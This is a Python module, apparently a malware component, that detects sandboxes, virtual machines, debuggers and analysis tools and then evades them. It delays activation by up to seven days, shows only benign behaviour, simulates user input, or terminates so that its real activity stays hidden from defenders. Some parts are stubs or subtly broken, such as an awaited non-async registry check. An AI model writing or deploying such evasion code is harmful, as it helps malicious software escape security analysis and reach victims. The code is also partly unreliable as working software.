"""
Advanced Sandbox Detection and Evasion Techniques
Detecting and escaping virtualized environments, analysis systems, and honeypots
"""

import os
import sys
import platform
import time
import psutil
import socket
import struct
import ctypes
from ctypes import wintypes
import asyncio
from typing import Dict, List, Any, Optional
import logging
import random

# Platform-specific imports
if sys.platform == "win32":
    import winreg
    import pythoncom
    import wmi

class SandboxDetector:
    """Advanced sandbox and virtual machine detection"""
    
    def __init__(self):
        self.detection_methods = []
        self.sandbox_indicators = {}
        self.logger = logging.getLogger(__name__)
        self._load_detection_methods()
    
    def _load_detection_methods(self):
        """Load comprehensive sandbox detection techniques"""
        
        self.detection_methods = [
            {'name': 'process_analysis', 'function': self._analyze_processes, 'weight': 0.9},
            {'name': 'hardware_analysis', 'function': self._analyze_hardware, 'weight': 0.8},
            {'name': 'network_analysis', 'function': self._analyze_network, 'weight': 0.7},
            {'name': 'memory_analysis', 'function': self._analyze_memory, 'weight': 0.6},
            {'name': 'registry_analysis', 'function': self._analyze_registry, 'weight': 0.8},
            {'name': 'file_system_analysis', 'function': self._analyze_filesystem, 'weight': 0.7},
            {'name': 'timing_analysis', 'function': self._analyze_timing, 'weight': 0.9},
            {'name': 'screen_analysis', 'function': self._analyze_screen, 'weight': 0.6},
        ]
    
    async def detect_sandbox(self) -> Dict[str, Any]:
        """Comprehensive sandbox detection with confidence scoring"""
        
        results = {}
        total_confidence = 0.0
        total_weight = 0.0
        
        for method in self.detection_methods:
            try:
                detection_result = await method['function']()
                results[method['name']] = detection_result
                
                if detection_result['is_sandbox']:
                    total_confidence += detection_result['confidence'] * method['weight']
                    total_weight += method['weight']
                    
            except Exception as e:
                self.logger.debug(f"Detection method {method['name']} failed: {e}")
                continue
        
        overall_confidence = total_confidence / total_weight if total_weight > 0 else 0.0
        
        return {
            'is_sandbox': overall_confidence > 0.5,
            'confidence': overall_confidence,
            'detailed_results': results,
            'recommended_action': self._get_evasion_recommendation(overall_confidence)
        }
    
    async def _analyze_processes(self) -> Dict[str, Any]:
        """Analyze running processes for sandbox indicators"""
        
        sandbox_processes = {
            'vbox': ['vboxservice', 'vboxtray', 'virtualbox'],
            'vmware': ['vmwaretray', 'vmwareuser', 'vmwareservice'],
            'parallels': ['prl_cc', 'prl_tools'],
            'sandboxie': ['sandboxie', 'sbiectrl'],
            'cuckoo': ['cuckoo', 'analyzer'],
            'wireshark': ['wireshark', 'tshark'],
            'procmon': ['procmon', 'processmonitor'],
            'debuggers': ['ollydbg', 'x32dbg', 'x64dbg', 'ida', 'immunity']
        }
        
        detected_processes = []
        for process in psutil.process_iter(['name']):
            try:
                process_name = process.info['name'].lower()
                for category, indicators in sandbox_processes.items():
                    if any(indicator in process_name for indicator in indicators):
                        detected_processes.append((category, process_name))
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        confidence = min(len(detected_processes) * 0.3, 1.0)
        
        return {
            'is_sandbox': len(detected_processes) > 0,
            'confidence': confidence,
            'detected_processes': detected_processes,
            'total_processes': len(detected_processes)
        }
    
    async def _analyze_hardware(self) -> Dict[str, Any]:
        """Analyze hardware characteristics for VM indicators"""
        
        indicators = 0
        total_checks = 0
        
        # Check CPU core count (VMs often have round numbers)
        cpu_cores = psutil.cpu_count()
        if cpu_cores in [1, 2, 4, 8, 16, 32]:  # Common VM configurations
            indicators += 1
        total_checks += 1
        
        # Check RAM size (VMs often have specific amounts)
        ram_gb = psutil.virtual_memory().total / (1024**3)
        if ram_gb in [1, 2, 4, 8, 16, 32]:  # Common VM RAM sizes
            indicators += 1
        total_checks += 1
        
        # Check for VM-specific hardware
        system_info = platform.system().lower()
        if any(vm_indicator in system_info for vm_indicator in ['virtual', 'vmware', 'vbox', 'qemu']):
            indicators += 1
        total_checks += 1
        
        # Check MAC address for VM vendors
        try:
            mac_vendors = await self._get_mac_vendors()
            vm_vendors = ['vmware', 'virtualbox', 'parallels', 'microsoft', 'qemu']
            if any(vendor in str(mac_vendors).lower() for vendor in vm_vendors):
                indicators += 1
            total_checks += 1
        except Exception:
            total_checks += 1
        
        confidence = indicators / total_checks if total_checks > 0 else 0.0
        
        return {
            'is_sandbox': indicators > 0,
            'confidence': confidence,
            'indicators_found': indicators,
            'total_checks': total_checks
        }
    
    async def _get_mac_vendors(self) -> List[str]:
        """Get MAC address vendors for VM detection"""
        
        vendors = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address.replace(':', '').upper()[:6]
                    # In production, this would query a MAC vendor database
                    vendors.append(mac)
        return vendors
    
    async def _analyze_timing(self) -> Dict[str, Any]:
        """Timing-based sandbox detection"""
        
        # Sandboxes often have accelerated or delayed timing
        timing_anomalies = 0
        
        # CPU timing test
        start_time = time.time()
        self._cpu_intensive_operation()
        cpu_time = time.time() - start_time
        
        # Very fast execution might indicate emulation
        if cpu_time < 0.01:  # Unrealistically fast
            timing_anomalies += 1
        
        # Sleep acceleration test
        start_time = time.time()
        time.sleep(1.0)  # Sleep for 1 second
        actual_sleep = time.time() - start_time
        
        # Check if sleep was accelerated (common in sandboxes)
        if actual_sleep < 0.9:  # Sleep accelerated
            timing_anomalies += 1
        
        # High resolution timer test
        timer_resolution = self._check_timer_resolution()
        if timer_resolution > 100:  # Poor timer resolution
            timing_anomalies += 1
        
        confidence = min(timing_anomalies * 0.5, 1.0)
        
        return {
            'is_sandbox': timing_anomalies > 0,
            'confidence': confidence,
            'cpu_time': cpu_time,
            'sleep_time': actual_sleep,
            'timer_resolution': timer_resolution,
            'anomalies_detected': timing_anomalies
        }
    
    def _cpu_intensive_operation(self):
        """Perform CPU-intensive operation for timing analysis"""
        result = 0
        for i in range(1000000):
            result += i * i
        return result
    
    def _check_timer_resolution(self) -> float:
        """Check system timer resolution"""
        try:
            start = time.perf_counter()
            time.sleep(0.001)  # 1ms sleep
            end = time.perf_counter()
            return (end - start) * 1000  # Convert to ms
        except:
            return 0.0
    
    async def _analyze_memory(self) -> Dict[str, Any]:
        """Memory analysis for sandbox detection"""
        
        try:
            total_memory = psutil.virtual_memory().total
            available_memory = psutil.virtual_memory().available
            
            # Sandboxes often have limited memory
            memory_pressure = 1.0 - (available_memory / total_memory)
            
            # High memory pressure might indicate resource-constrained sandbox
            is_sandbox = memory_pressure > 0.8  # 80% memory usage
            confidence = memory_pressure if is_sandbox else 0.0
            
            return {
                'is_sandbox': is_sandbox,
                'confidence': confidence,
                'total_memory': total_memory,
                'available_memory': available_memory,
                'memory_pressure': memory_pressure
            }
        except Exception:
            return {'is_sandbox': False, 'confidence': 0.0}
    
    async def _analyze_network(self) -> Dict[str, Any]:
        """Network configuration analysis"""
        
        try:
            # Check for unusual network configurations
            interfaces = psutil.net_if_addrs()
            
            # Sandboxes often have limited or unusual network interfaces
            unusual_interface_count = len(interfaces) < 2  # Very few interfaces
            confidence = 0.7 if unusual_interface_count else 0.0
            
            return {
                'is_sandbox': unusual_interface_count,
                'confidence': confidence,
                'interface_count': len(interfaces),
                'interface_names': list(interfaces.keys())
            }
        except Exception:
            return {'is_sandbox': False, 'confidence': 0.0}
    
    def _analyze_registry(self) -> Dict[str, Any]:
        """Windows registry analysis for VM indicators"""
        
        if sys.platform != "win32":
            return {'is_sandbox': False, 'confidence': 0.0, 'reason': 'not_windows'}
        
        try:
            vm_indicators = 0
            registry_checks = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum", "0", "VMware"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SCSI Port\Enum", "0", "VBOX"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\Description\System", "SystemBiosVersion", "VMware"),
            ]
            
            for hkey, subkey, value, indicator in registry_checks:
                try:
                    with winreg.OpenKey(hkey, subkey) as key:
                        data, _ = winreg.QueryValueEx(key, value)
                        if indicator.lower() in str(data).lower():
                            vm_indicators += 1
                except FileNotFoundError:
                    continue
            
            confidence = min(vm_indicators * 0.5, 1.0)
            
            return {
                'is_sandbox': vm_indicators > 0,
                'confidence': confidence,
                'registry_indicators': vm_indicators
            }
        except Exception as e:
            return {'is_sandbox': False, 'confidence': 0.0, 'error': str(e)}
    
    async def _analyze_filesystem(self) -> Dict[str, Any]:
        """Filesystem analysis for sandbox indicators"""
        
        sandbox_paths = [
            r"C:\analysis", r"C:\sandbox", r"C:\malware",
            r"/tmp/cuckoo", r"/tmp/analysis", "/sandbox"
        ]
        
        detected_paths = []
        for path in sandbox_paths:
            if os.path.exists(path):
                detected_paths.append(path)
        
        confidence = min(len(detected_paths) * 0.4, 1.0)
        
        return {
            'is_sandbox': len(detected_paths) > 0,
            'confidence': confidence,
            'detected_paths': detected_paths
        }
    
    async def _analyze_screen(self) -> Dict[str, Any]:
        """Screen resolution analysis"""
        
        try:
            if sys.platform == "win32":
                user32 = ctypes.windll.user32
                width = user32.GetSystemMetrics(0)
                height = user32.GetSystemMetrics(1)
                
                # Sandboxes often have low or standard resolutions
                common_sandbox_resolutions = [(800, 600), (1024, 768), (1280, 720)]
                is_sandbox = (width, height) in common_sandbox_resolutions
                confidence = 0.6 if is_sandbox else 0.0
                
                return {
                    'is_sandbox': is_sandbox,
                    'confidence': confidence,
                    'resolution': (width, height)
                }
            else:
                return {'is_sandbox': False, 'confidence': 0.0}
        except Exception:
            return {'is_sandbox': False, 'confidence': 0.0}
    
    def _get_evasion_recommendation(self, confidence: float) -> str:
        """Get evasion recommendation based on sandbox detection confidence"""
        
        if confidence > 0.8:
            return "terminate_immediately"  # High confidence sandbox detection
        elif confidence > 0.5:
            return "delayed_execution"  # Possible sandbox, delay real activity
        elif confidence > 0.3:
            return "benign_behavior"  # Suspicious, show only benign behavior
        else:
            return "proceed_normal"  # Likely real environment


class SandboxEvader:
    """Advanced sandbox evasion techniques"""
    
    def __init__(self):
        self.detector = SandboxDetector()
        self.evasion_tactics = []
        self._load_evasion_tactics()
    
    def _load_evasion_tactics(self):
        """Load sandbox evasion tactics"""
        
        self.evasion_tactics = [
            {'name': 'timing_based_evasion', 'function': self._timing_evasion, 'effectiveness': 0.8},
            {'name': 'environment_spoofing', 'function': self._environment_spoofing, 'effectiveness': 0.7},
            {'name': 'behavior_masking', 'function': self._behavior_masking, 'effectiveness': 0.9},
            {'name': 'delayed_activation', 'function': self._delayed_activation, 'effectiveness': 0.85},
            {'name': 'user_interaction_simulation', 'function': self._user_interaction_simulation, 'effectiveness': 0.75},
        ]
    
    async def evade_sandbox(self) -> Dict[str, Any]:
        """Execute comprehensive sandbox evasion"""
        
        detection_result = await self.detector.detect_sandbox()
        
        if not detection_result['is_sandbox']:
            return {
                'evasion_performed': False,
                'reason': 'No sandbox detected',
                'detection_confidence': detection_result['confidence']
            }
        
        # Apply evasion tactics based on confidence level
        applied_tactics = []
        confidence = detection_result['confidence']
        
        if confidence > 0.7:
            # High confidence - aggressive evasion
            tactics_to_apply = ['timing_based_evasion', 'delayed_activation', 'behavior_masking']
        elif confidence > 0.4:
            # Medium confidence - moderate evasion
            tactics_to_apply = ['timing_based_evasion', 'behavior_masking']
        else:
            # Low confidence - light evasion
            tactics_to_apply = ['behavior_masking']
        
        for tactic_name in tactics_to_apply:
            tactic = next((t for t in self.evasion_tactics if t['name'] == tactic_name), None)
            if tactic:
                result = await tactic['function'](detection_result)
                applied_tactics.append({
                    'name': tactic_name,
                    'result': result,
                    'effectiveness': tactic['effectiveness']
                })
        
        return {
            'evasion_performed': True,
            'detection_confidence': confidence,
            'applied_tactics': applied_tactics,
            'recommendation': detection_result['recommended_action']
        }
    
    async def _timing_evasion(self, detection_result: Dict) -> Dict:
        """Timing-based evasion techniques"""
        
        # Introduce random delays to defeat timing analysis
        delay = random.uniform(5.0, 30.0)  # 5-30 second delay
        await asyncio.sleep(delay)
        
        # Perform fake timing operations
        self._fake_timing_operations()
        
        return {
            'action': 'timing_evasion',
            'delay_applied': delay,
            'status': 'completed'
        }
    
    def _fake_timing_operations(self):
        """Perform fake timing operations to confuse analysis"""
        
        # Simulate various timing patterns
        for _ in range(random.randint(10, 50)):
            start = time.perf_counter()
            # Fake computation
            result = 0
            for i in range(1000):
                result += i * i
            elapsed = time.perf_counter() - start
            
            # Vary timing patterns
            if elapsed < 0.001:
                time.sleep(random.uniform(0.001, 0.01))
    
    async def _delayed_activation(self, detection_result: Dict) -> Dict:
        """Delayed activation to avoid sandbox timeouts"""
        
        # Sandboxes often have time limits - delay real activity
        delay_hours = random.randint(24, 168)  # 1-7 days delay
        activation_time = time.time() + (delay_hours * 3600)
        
        return {
            'action': 'delayed_activation',
            'scheduled_activation': activation_time,
            'delay_hours': delay_hours,
            'status': 'scheduled'
        }
    
    async def _behavior_masking(self, detection_result: Dict) -> Dict:
        """Mask real behavior with benign activities"""
        
        # Perform benign system interactions
        benign_actions = [
            self._simulate_file_browsing,
            self._simulate_web_browsing,
            self._simulate_document_editing,
            self._simulate_user_interaction
        ]
        
        for action in random.sample(benign_actions, k=random.randint(2, 4)):
            try:
                action()
            except Exception:
                continue
        
        return {
            'action': 'behavior_masking',
            'benign_actions_performed': len(benign_actions),
            'status': 'completed'
        }
    
    def _simulate_file_browsing(self):
        """Simulate normal file browsing behavior"""
        
        common_paths = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            "C:\\Windows\\System32" if sys.platform == "win32" else "/etc"
        ]
        
        for path in random.sample(common_paths, k=min(2, len(common_paths))):
            try:
                if os.path.exists(path):
                    # List some files (but don't access them)
                    files = os.listdir(path)
                    # Just access a few file names
                    _ = random.sample(files, k=min(3, len(files)))
            except Exception:
                continue
    
    def _simulate_web_browsing(self):
        """Simulate web browsing behavior"""
        
        # This would be implemented with actual HTTP requests to benign sites
        pass
    
    def _simulate_document_editing(self):
        """Simulate document editing behavior"""
        
        # Create and modify a temporary document
        try:
            temp_file = os.path.join(os.path.expanduser("~/Documents"), f"temp_{int(time.time())}.txt")
            with open(temp_file, 'w') as f:
                f.write("This is a temporary document created during normal user activity.\n")
            
            # Simulate some edits
            with open(temp_file, 'a') as f:
                f.write("Additional content added during editing session.\n")
            
            # Clean up
            os.unlink(temp_file)
        except Exception:
            pass
    
    async def _user_interaction_simulation(self, detection_result: Dict) -> Dict:
        """Simulate user interactions"""
        
        if sys.platform == "win32":
            await self._simulate_windows_interactions()
        else:
            await self._simulate_linux_interactions()
        
        return {
            'action': 'user_interaction_simulation',
            'platform': sys.platform,
            'status': 'completed'
        }
    
    async def _simulate_windows_interactions(self):
        """Simulate Windows user interactions"""
        
        try:
            import win32api
            import win32con
            
            # Simulate mouse movements
            for _ in range(random.randint(5, 15)):
                x = random.randint(0, 1920)
                y = random.randint(0, 1080)
                win32api.SetCursorPos((x, y))
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
        except ImportError:
            # win32api not available
            pass
    
    async def _simulate_linux_interactions(self):
        """Simulate Linux user interactions"""
        
        # Simulate terminal activity
        commands = [
            "ls -la",
            "pwd",
            "whoami",
            "date",
            "echo 'normal user activity'"
        ]
        
        for cmd in random.sample(commands, k=random.randint(2, 4)):
            try:
                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await process.communicate()
            except Exception:
                continue
    
    async def _environment_spoofing(self, detection_result: Dict) -> Dict:
        """Spoof environment to appear as real system"""
        
        # This would involve more advanced system-level spoofing
        # For now, return a placeholder
        
        return {
            'action': 'environment_spoofing',
            'status': 'requires_advanced_implementation',
            'note': 'Advanced environment spoofing requires kernel-level modifications'
        }
